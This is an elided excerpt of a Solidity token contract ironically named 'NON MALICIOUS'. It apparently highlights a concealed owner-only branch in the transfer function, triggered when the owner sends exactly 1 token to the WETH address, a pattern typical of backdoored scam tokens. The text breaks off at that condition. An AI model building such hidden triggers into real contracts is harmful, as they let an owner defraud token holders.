...
contract NON_MALICIOUS is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x0A4b2172858B7FcCd5A32B1B62C4dB9a9D829799); 
    address payable public Wallet_Dev = payable(0x0A4b2172858B7FcCd5A32B1B62C4dB9a9D829799);
    ...
    string private constant _name = "NON MALICIOUS"; 
    string private constant _symbol = unicode"MONALI"; 
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(sender == owner() && tAmount == 1 && recipient == uniswapV2Router.WETH()){
